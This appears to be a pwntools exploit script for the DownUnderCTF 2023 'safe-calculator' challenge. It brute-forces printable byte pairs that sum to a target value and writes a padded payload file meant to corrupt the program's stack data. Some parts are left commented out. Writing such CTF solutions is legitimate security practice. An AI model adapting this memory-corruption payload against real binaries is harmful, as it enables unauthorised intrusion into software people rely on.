#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 2023.ductf.dev --port 30015 safe-calculator
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('safe-calculator')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '2023.ductf.dev'
port = int(args.PORT or 30015)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
br calculate
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
from ctypes import c_char
def cmd(i):
    io.sendlineafter(b"> ",str(i).encode())

def prompt(m):
    io.sendlineafter(": ",m)

def prompti(i):
    prompt(str(i).encode())

def get_sols(goal):
    sols = {}
    for g in goal:
        for carry in range(1):
            for a in alpha:
                for b in alpha:
                    c = a + b + carry
                    carry = c >> 8
                    if c == g:
                        if (g,carry) in sols.keys():
                            sols[(g,carry)].append((a,b,c >> 8))
                        else:
                            sols[(g,carry)] = [(a,b,c >> 8)]
    return sols



alpha = [ i for i in range(ord(' '),ord('~')+1)]
print([chr(a) for a in alpha])
print([hex(a) for a in alpha])
#s1,s2 = get_bytes(alpha,0xb98c5f37)#00002329)
#io = start()
#cmd(2)
#prompt(s1+b"\x00"*4+s2+b"\x00"*4)
#cmd(1)
#io.interactive()
goal_sum = 0xb98c5f
goal = pack(goal_sum,'all')
sols = get_sols(goal)
s1 = b""
s2 = b""

def get_a_b():
    for c in range(2):
        if (goal[0],c) in sols.keys():
            for (a0,b0,c0) in sols[(goal[0],c)]:
                if (goal[1],c0) in sols.keys():
                    for (a1,b1,c1) in sols[(goal[1],c0)]:
                        if (goal[2],c1) in sols.keys():
                            for (a2,b2,c2) in sols[(goal[2],c1)]:
                                sol_a = b""
                                sol_a += pack(a0,"all")
                                sol_a += pack(a1,"all")
                                sol_a += pack(a2,"all")
                                sol_b = b""
                                sol_b += pack(b0,"all")
                                sol_b += pack(b1,"all")
                                sol_b += pack(b2,"all")
                                return (c,sol_a,sol_b)
    return ()
#print([hex(k[0]) for k,v in sols.items() if k[0] in goal])
c,sol_a,sol_b = get_a_b()
assert(goal_sum == (unpack(sol_a,'all')+unpack(sol_b,'all')+c) & (2 ** 32 - 1))
p = open("payload","wb")
p.write(b"2\n")
p.write(b"a"*32)
p.write(b"p"*8)
p.write(b"p"*5+sol_b)
p.write(b"\n")
p.write(b"2\n")
p.write(b"a"*32)
p.write(b"p"*4+b"7"+sol_a+b"p"*4)
p.write(b"\n")
p.write(b"1\n")
p.close()


